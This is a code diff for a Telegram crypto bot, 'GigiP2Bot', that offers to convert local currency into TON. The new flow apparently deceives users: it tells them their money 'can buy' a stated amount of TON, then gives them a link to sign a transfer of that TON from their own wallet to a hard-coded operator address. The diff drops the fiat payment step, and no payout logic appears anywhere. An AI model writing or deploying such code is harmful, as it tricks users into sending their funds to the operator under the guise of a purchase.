@@ -1,9 +1,9 @@
 import os
-import time
+import json
 import logging
 import requests
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, ReplyKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 
 # Logging
@@ -12,141 +12,95 @@ logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=lo
 # Bot token
 BOT_TOKEN = os.environ["BOT_TOKEN"]
 
-# Global data
+# Data
+user_data = {}
+user_pending_fiat = {}
+user_pending_amount = {}
 user_wallets = {}
-user_orders = {}
-user_signatures = {}
-user_preferences = {}
-user_pending_sell = {}
-user_pending_buy_ton = {}
-SUPPORTED_CRYPTOS = ["usdt", "btc", "eth", "bnb", "sol", "ton", "ada", "xrp", "dot", "doge"]
-SUPPORTED_FIATS = ["USD", "NGN", "EUR", "KES", "GHS", "ZAR", "GBP"]
 TON_RECEIVE_ADDRESS = "UQCMbQomO3XD1FSt7pyfjqj2jBRzyg23myKDtCky_CedKpEH"
-TON_CONNECT_LINK = "https://gigi-ton-connect.vercel.app/?returnUrl=https%3A%2F%2Ft.me%2FGigiP2Bot"
+TON_CONNECT_BASE = "https://gigi-ton-connect.vercel.app/sign"
+SUPPORTED_FIATS = ["NGN", "GHS", "KES"]
 
-# Price fetching
-def get_bybit_price(symbol):
+# --- API Helpers ---
+def get_usdt_to_fiat_rate(fiat):
     try:
-        url = f"https://api.bybit.com/v5/market/tickers?category=spot&symbol={symbol.upper()}USDT"
+        url = f"https://api.exchangerate-api.com/v4/latest/USD"
+        r = requests.get(url).json()
+        return r['rates'].get(fiat.upper(), None)
+    except:
+        return None
+
+def get_ton_usdt_price():
+    try:
+        url = f"https://api.bybit.com/v5/market/tickers?category=spot&symbol=TONUSDT"
         r = requests.get(url).json()
         return float(r["result"]["list"][0]["lastPrice"])
     except:
         return None
 
-def get_bitget_price(symbol):
-    try:
-        url = f"https://api.bitget.com/api/spot/v1/market/ticker?symbol={symbol.upper()}USDT"
-        r = requests.get(url).json()
-        return float(r["data"]["close"])
-    except:
-        return None
-
-def get_best_price(symbol):
-    prices = [p for p in [get_bybit_price(symbol), get_bitget_price(symbol)] if p]
-    if prices:
-        return f"\U0001F4B0 *{symbol.upper()}*: ${min(prices):,.2f}"
-    return f"\u274C Couldn't get {symbol.upper()} price"
-
-# Start command
+# --- Handlers ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("\U0001F517 Connect Wallet", url=TON_CONNECT_LINK)],
-        [InlineKeyboardButton("\U0001F4B5 Buy Crypto", callback_data="buy_crypto")],
-        [InlineKeyboardButton("\U0001F4B8 Sell Crypto", callback_data="sell_crypto")]
-    ]
+    uid = update.message.chat_id
+    keyboard = [[InlineKeyboardButton(fiat, callback_data=f"fiat_{fiat}")] for fiat in SUPPORTED_FIATS]
     await update.message.reply_text(
-        "\U0001F44B Welcome to *GigiP2Bot* — your Web3 assistant \U0001F916\U0001F4B8\n\n"
-        "Say things like:\n"
-        "• *Buy BTC fast*\n"
-        "• *Sell TON now*\n"
-        "• *Buy TON with fiat*\n"
-        "• *Connect my wallet*\n\n"
-        "\U0001F447 Start by connecting:",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup(keyboard)
+        "\U0001F4B5 Welcome to *GigiP2Bot*!\n\nPlease choose your local currency:",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode=ParseMode.MARKDOWN
     )
 
-# Dynamic chat handler
-async def chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    uid = query.message.chat_id
+
+    if query.data.startswith("fiat_"):
+        fiat = query.data.replace("fiat_", "")
+        user_data[uid] = {"fiat": fiat}
+        user_pending_fiat[uid] = True
+        await query.message.reply_text(f"\U0001F4B0 Great! Now enter the amount in {fiat} you want to convert to TON (e.g. 5000):")
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.message.chat_id
     text = update.message.text.strip().lower()
 
-    # Step 1: Trigger sell TON
-    if text in ["sell ton", "cash out ton"]:
-        user_wallet = user_wallets.get(uid)
-        if not user_wallet or user_wallet.get("type") != "ton":
-            await update.message.reply_text("\u26A0\uFE0F Please connect your TON wallet first to sell TON.")
-            return
-        user_pending_sell[uid] = True
-        await update.message.reply_text("\U0001F4B0 How much TON would you like to sell?")
-        return
-
-    # Step 2: Handle TON amount sell
-    if uid in user_pending_sell:
-        try:
-            amount_ton = float(text)
-            amount_nano = int(amount_ton * 1e9)
-            ton_link = f"ton://transfer/{TON_RECEIVE_ADDRESS}?amount={amount_nano}"
-            keyboard = [[InlineKeyboardButton(f"\u2705 Authorize {amount_ton} TON", url=ton_link)]]
-            prompt = (
-                f"\U0001F4B8 Almost done! Please authorize sending <b>{amount_ton} TON</b> to our service wallet "
-                f"to complete your cash-out. Tap the button below to confirm \U0001F4F2."
-            )
-            await update.message.reply_text(prompt, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
-            del user_pending_sell[uid]
-        except:
-            await update.message.reply_text("\u274C Please enter a valid number like 1.5 or 3")
-        return
-
-    # Step 3: Buy TON with fiat
-    if text in ["buy ton", "buy ton with fiat"]:
-        user_pending_buy_ton[uid] = True
-        await update.message.reply_text("\U0001F4B5 How much (in your local currency) would you like to spend to buy TON?")
-        return
-
-    if uid in user_pending_buy_ton:
+    # Fiat conversion to TON
+    if uid in user_pending_fiat:
         try:
             amount_fiat = float(text)
-            keyboard = [
-                [InlineKeyboardButton("\U0001F30D Pay with Paystack", url="https://paystack.com/pay/example")],
-                [InlineKeyboardButton("\U0001F680 Pay with MoonPay", url="https://www.moonpay.com/buy")],
-                [InlineKeyboardButton("\U0001F310 Pay with Transak", url="https://global.transak.com/")]
-            ]
+            fiat = user_data[uid]["fiat"]
+            usdt_to_fiat = get_usdt_to_fiat_rate(fiat)
+            ton_usdt = get_ton_usdt_price()
+
+            if not usdt_to_fiat or not ton_usdt:
+                await update.message.reply_text("\u274C Couldn't fetch live rates. Try again later.")
+                return
+
+            usdt_amount = amount_fiat / usdt_to_fiat
+            ton_amount = usdt_amount / ton_usdt
+
+            nano_amount = int(ton_amount * 1e9)
+            ton_sign_url = f"{TON_CONNECT_BASE}?amount={nano_amount}&to={TON_RECEIVE_ADDRESS}"
+            keyboard = [[InlineKeyboardButton("\u2705 Sign with TON Wallet", url=ton_sign_url)]]
+
             await update.message.reply_text(
-                f"\U0001F9FE You’re buying TON worth <b>{amount_fiat}</b> in your local currency.\n\nChoose a payment provider:",
+                f"\U0001F4B8 {amount_fiat:.2f} {fiat} can buy you ~<b>{ton_amount:.4f} TON</b> today.\n\nSign the transaction to continue:",
                 reply_markup=InlineKeyboardMarkup(keyboard),
                 parse_mode="HTML"
             )
-            del user_pending_buy_ton[uid]
+            del user_pending_fiat[uid]
         except:
-            await update.message.reply_text("\u274C Please enter a valid amount like 5000 or 200")
+            await update.message.reply_text("\u274C Invalid amount. Please enter a number like 5000 or 200.")
         return
 
-    # Step 4: Wallet signing
-    if "sign" in text:
-        user_wallet = user_wallets.get(uid)
-        if not user_wallet:
-            await update.message.reply_text("\U0001F510 Connect a wallet first.")
-            return
-        wallet_type = user_wallet.get("type")
-        if wallet_type == "evm":
-            await update.message.reply_text("\U0001F7E3 Please sign the transaction in your MetaMask wallet.")
-        elif wallet_type == "solana":
-            await update.message.reply_text("\U0001F7E1 Please sign the transaction in your Phantom wallet.")
-        elif wallet_type == "ton":
-            await update.message.reply_text("\U0001F537 Please sign using TON Connect link provided.")
-        else:
-            await update.message.reply_text("\u274C Unknown wallet type.")
-        return
+    await update.message.reply_text("\U0001F916 Try /start to begin again or type an amount to convert.")
 
-    await update.message.reply_text("\U0001F916 Try 'Sell TON', 'Buy TON', 'Connect wallet', or 'Sign'")
-
-# Main entry
+# Main
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, chat_handler))
-    logging.info("\U0001F680 GigiP2Bot running...")
+    app.add_handler(CallbackQueryHandler(handle_callback))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    logging.info("\U0001F680 GigiP2Bot with Fiat Conversion + TON Signing is LIVE!")
     app.run_polling()
 
 if __name__ == "__main__":
